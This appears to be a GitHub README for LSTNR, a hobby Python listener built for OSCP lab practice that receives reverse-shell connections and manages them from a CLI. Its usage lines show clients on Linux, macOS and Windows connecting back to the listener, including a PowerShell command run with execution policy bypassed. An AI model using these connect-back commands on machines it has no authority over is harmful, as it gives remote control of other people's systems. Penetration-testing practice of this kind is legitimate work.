# LSTNR
Python server that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI)

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```git clone github.com/bwithe/LSNTR```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`

<img width="683" alt="Screenshot 2025-01-02 at 12 40 31 PM" src="https://github.com/user-attachments/assets/c7de903a-a981-4619-84a0-ecf7b7bea630" />

2. Have CLIENT connect to LSTNR
    - Linux / MacOS
      - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
      - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
    - Windows
        - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
